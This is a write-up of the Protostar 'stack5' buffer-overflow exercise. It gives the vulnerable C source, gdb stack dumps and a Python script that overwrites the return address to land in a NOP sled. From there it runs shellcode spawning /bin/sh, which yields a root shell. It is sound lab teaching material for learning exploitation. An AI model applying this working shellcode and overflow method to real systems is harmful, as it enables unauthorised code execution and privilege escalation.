## STACK FIVE ##
Stack5 is a standard buffer overflow, this time introducing shellcode.

This level is at /opt/protostar/bin/stack5

Hints

At this point in time, it might be easier to use someone elses shellcode
If debugging the shellcode, use \xcc (int3) to stop the program executing and return to the debugger
remove the int3s once your shellcode is done.
### Source Code ###
```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```
After disassemble the code, the variables can be interpreted as below
```
0x080483c4 <main+0>:    push %ebp
0x080483c5 <main+1>:    mov    %esp,%ebp
0x080483c7 <main+3>:    and    $0xfffffff0,%esp
0x080483ca <main+6>:    sub    $0x50,%esp
0x080483cd <main+9>:    lea    0x10(%esp),%eax
0x080483d1 <main+13>:   mov    %eax,(%esp)
0x080483d4 <main+16>:   call   0x80482e8 <gets@plt>
0x080483d9 <main+21>:   leave
0x080483da <main+22>:   ret     <- breakpoint here to find the right address to jump to
```
Let's run with a dump input
```
Breakpoint 2, main (argc=1, argv=0xbffff854) at stack5/stack5.c:11
11      in stack5/stack5.c
(gdb) c
Continuing.
eax            0xbffff760       -1073744032
ecx            0xbffff760       -1073744032
edx            0xb7fd9334       -1208118476
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff7ac       0xbffff7ac
ebp            0xbffff828       0xbffff828
esi            0x0      0
edi            0x0      0
eip            0x80483da        0x80483da <main+22>
eflags         0x200246 [ PF ZF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
0xbffff7ac:     0xb7eadc76      0x00000001      0xbffff854      0xbffff85c
0xbffff7bc:     0xb7fe1848      0xbffff810      0xffffffff      0xb7ffeff4
0xbffff7cc:     0x08048232      0x00000001      0xbffff810      0xb7ff0626
0xbffff7dc:     0xb7fffab0      0xb7fe1b28      0xb7fd7ff4      0x00000000
0xbffff7ec:     0x00000000      0xbffff828      0xab35e505      0x8162f315
0xbffff7fc:     0x00000000      0x00000000      0x00000000      0x00000001
0x80483da <main+22>:    ret    
0x80483db:      nop

Breakpoint 3, 0x080483da in main (argc=134513604, argv=0x1) at stack5/stack5.c:11
11      in stack5/stack5.c
(gdb) si
eax            0xbffff760       -1073744032
ecx            0xbffff760       -1073744032
edx            0xb7fd9334       -1208118476
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff7b0       0xbffff7b0
ebp            0xbffff828       0xbffff828
esi            0x0      0
edi            0x0      0
eip            0xb7eadc76       0xb7eadc76 <__libc_start_main+230>
eflags         0x200246 [ PF ZF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
0xbffff7b0:     0x00000001      0xbffff854      0xbffff85c      0xb7fe1848
0xbffff7c0:     0xbffff810      0xffffffff      0xb7ffeff4      0x08048232
0xbffff7d0:     0x00000001      0xbffff810      0xb7ff0626      0xb7fffab0
0xbffff7e0:     0xb7fe1b28      0xb7fd7ff4      0x00000000      0x00000000
0xbffff7f0:     0xbffff828      0xab35e505      0x8162f315      0x00000000
0xbffff800:     0x00000000      0x00000000      0x00000001      0x08048310
0xb7eadc76 <__libc_start_main+230>:     mov    %eax,(%esp)
0xb7eadc79 <__libc_start_main+233>:     call   0xb7ec60c0 <*__GI_exit>
__libc_start_main (main=0x80483c4 <main>, argc=1, ubp_av=0xbffff854, init=0x80483f0 <__libc_csu_init>, fini=0x80483e0 <__libc_csu_fini>, rtld_fini=0xb7ff1040 <_dl_fini>, stack_end=0xbffff84c) at libc-start.c:260
260     libc-start.c: No such file or directory.
        in libc-start.c

```
So 0xbffff7b0 is the address on the stack that we want to jump to execute our
code.
Therefore, we need to prepare a script *inject.py* to do this 
```python
import struct

buffer = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS"
eip = struct.pack("I", 0xbffff7b0 + 50)  # padding 50 so that the address will
                                         # be in the middle of nop code '\x90'
                                         # this also compensates for difference
                                         # caused by environment variables
                                         # this should be tuned 
nop = "\x90" * 100      # nop code
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" # shell code for running a /bin/sh
print(buffer + eip + nop + shellcode)
```

Run the script and redirect it to a file to test with gdb first
```
python inject.py > input_inject.txt
```

Let's run again

```
gdb /opt/protostar/bin/stack5 
r < input_inject.txt
```
And the stack after
```
eax            0xbffff760       -1073744032
ecx            0xbffff760       -1073744032
edx            0xb7fd9334       -1208118476
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff750       0xbffff750
ebp            0xbffff7a8       0xbffff7a8
esi            0x0      0
edi            0x0      0
eip            0x80483d9        0x80483d9 <main+21>
eflags         0x200246 [ PF ZF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
0xbffff750:     0xbffff760      0xb7ec6165      0xbffff768      0xb7eada75
0xbffff760:     0x41414141      0x42424242      0x43434343      0x44444444
0xbffff770:     0x45454545      0x46464646      0x47474747      0x48484848
0xbffff780:     0x49494949      0x4a4a4a4a      0x4b4b4b4b      0x4c4c4c4c
0xbffff790:     0x4d4d4d4d      0x4e4e4e4e      0x4f4f4f4f      0x50505050
0xbffff7a0:     0x51515151      0x52525252      0x53535353      0xbffff7e2 <- here is the address we will jump to
0x80483d9 <main+21>:    leave
0x80483da <main+22>:    ret

Breakpoint 2, main (argc=-1869574000, argv=0x90909090) at stack5/stack5.c:11
11      in stack5/stack5.c
(gdb) c
Continuing.
eax            0xbffff760       -1073744032
ecx            0xbffff760       -1073744032
edx            0xb7fd9334       -1208118476
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff7ac       0xbffff7ac
ebp            0x53535353       0x53535353
esi            0x0      0
edi            0x0      0
eip            0x80483da        0x80483da <main+22>
eflags         0x200246 [ PF ZF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
0xbffff7ac:     0xbffff7e2      0x90909090      0x90909090      0x90909090  <- a bunch of nop code to run after jumpting to 0xbffff7e2
0xbffff7bc:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff7cc:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff7dc:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff7ec:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff7fc:     0x90909090      0x90909090      0x90909090      0x90909090
0x80483da <main+22>:    ret
0x80483db:      nop

Breakpoint 3, 0x080483da in main (argc=Cannot access memory at address 0x5353535b
) at stack5/stack5.c:11
11      in stack5/stack5.c
(gdb) c
Continuing.
Executing new program: /bin/dash       <- here we go

```

and run the python script 
```
(python inject.py ; cat | /opt/protostar/bin/stack5)
```
and the result

```
python inject.py ; cat) | /opt/protostar/bin/stack5
whoami
root

```

